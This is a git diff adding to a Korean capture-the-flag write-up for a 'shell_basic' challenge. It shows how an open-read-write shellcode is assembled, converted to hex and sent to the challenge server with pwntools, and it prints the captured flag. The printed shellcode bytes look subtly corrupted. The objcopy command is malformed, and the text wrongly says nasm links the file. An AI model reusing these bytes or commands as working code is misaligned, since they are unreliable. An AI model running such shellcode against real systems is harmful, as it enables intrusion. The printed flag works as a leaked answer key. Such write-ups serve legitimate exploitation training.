@@ -345,10 +345,61 @@ _start:
 
 ![image](https://github.com/user-attachments/assets/441c0ac0-4b4e-4f86-8e8a-73c0c1cfa174)
 
-![image](https://github.com/user-attachments/assets/54003647-1297-4812-a44a-3a27b6cbf926)
+`nasm -f elf64 shell_basic.asm ` 명령어를 통해, 컴파일 및 링크를 하여, object 파일을 만든다.
 
+<br>
+
+</br>
+
+![image](https://github.com/user-attachments/assets/54003647-1297-4812-a44a-3a27b6cbf926)
 ![image](https://github.com/user-attachments/assets/af6562db-775d-4c61-8c29-1cbd1487b5f2)
 
-\x6a\x00\x48\xb8\x6f\x6f\x6f\x6f\x6f\x6f\x6e\x67\x50\x48\xb8\x61\x6d\x65\x5f\x69\x73\x5f\x6c\x50\x48\xb8\x63\x2f\x66\x6c\x61\x67\x5f\x6e\x50\x48\xb8\x65\x6c\x6c\x5f\x62\x61\x73\x69\x50\x48\xb8\x2f\x68\x6f\x6d\x65\x2f\x73\x68\x50\x48\x89\xe7\x48\x31\xf6\xb0\x3d\x12\xb8\x02\x00\x00\x0f\x05\x48\xc7\x48\x31\xec\x30\x48\xb9\xe8\xba\x30\x00\x00\x00\xb8\x00\x00\x00\x0f\x05\xbf\x01\x00\x00\x00\xb8\x01\x00\x00\x0f\x05\x48\x31\xff\xb8\x3c\x00\x00\x00\x00\x0f\x05
+`objcopy --dump-section .text-shell_basic.bin shell_basic.o` 명령어를 통해, 바이너리로 변환한다.
 
+또한, `xxd shell_basic.bin` 명령어를 통해, 바이너리를 헥사코드로 변환한다.
+출력된 hex 값들을 잘 정리해주어 쉘 코드를 추출해보면,
+<br>
+
+</br>
+
+```
+\x6a\x00\x48\xb8\x6f\x6f\x6f\x6f\x6f\x6f\x6e\x67\x50\x48\xb8\x61\x6d\x65\x5f\x69\x73\x5f\x6c\x50\x48\xb8\x63\x2f\x66\x6c\x61\x67\x5f\x6e\x50\x48\xb8\x65\x6c\x6c\x5f\x62\x61\x73\x69\x50\x48\xb8\x2f\x68\x6f\x6d\x65\x2f\x73\x68\x50\x48\x89\xe7\x48\x31\xf6\xb0\x3d\x12\xb8\x02\x00\x00\x0f\x05\x48\xc7\x48\x31\xec\x30\x48\xb9\xe8\xba\x30\x00\x00\x00\xb8\x00\x00\x00\x0f\x05\xbf\x01\x00\x00\x00\xb8\x01\x00\x00\x0f\x05\x48\x31\xff\xb8\x3c\x00\x00\x00\x00\x0f\x05
+```
+이와 같다. 
+
+<br>
+
+</br>
+<br>
+
+</br>
+
+![image](https://github.com/user-attachments/assets/6d940ca9-1b47-4330-9b70-bf5d42002312)
+
+이제 위에서 얻은 쉘 코드를 pwntools를 써서 서버로 보내보려고 한다.
+그래서, 위와 같은 파이썬 코드를 작성해보았다. 
+코드가 지정된 호스트와 포트와 연결을 시도하고, 'shell code: ' 문자열을 서버에서 받을 때까지 대기하는 코드이다.
+그 후, 준비된 쉘 코드를 서버에 전송하고, 상호작용 모드로 전환하여 서버의 응답을 실시간으로 확인하고 상호작용할 수 있게 해주는 코드이다. 
+
+<br>
+
+</br>
+
+![image](https://github.com/user-attachments/assets/35952979-cdc5-43e2-b0b5-9831294d5ece)
+
+위 파이썬 파일을 실행해보니, 플래그가 출력되었다!!!!
+
+<br>
+
+</br>
+
+```
+DH{ca562d7cf1db6c55cb11c4ec350a3c0b}
+```
+
+<br>
+
+</br>
+
+![image](https://github.com/user-attachments/assets/4e024068-ea4a-4bb0-8f9c-ea55700c1cb1)
 
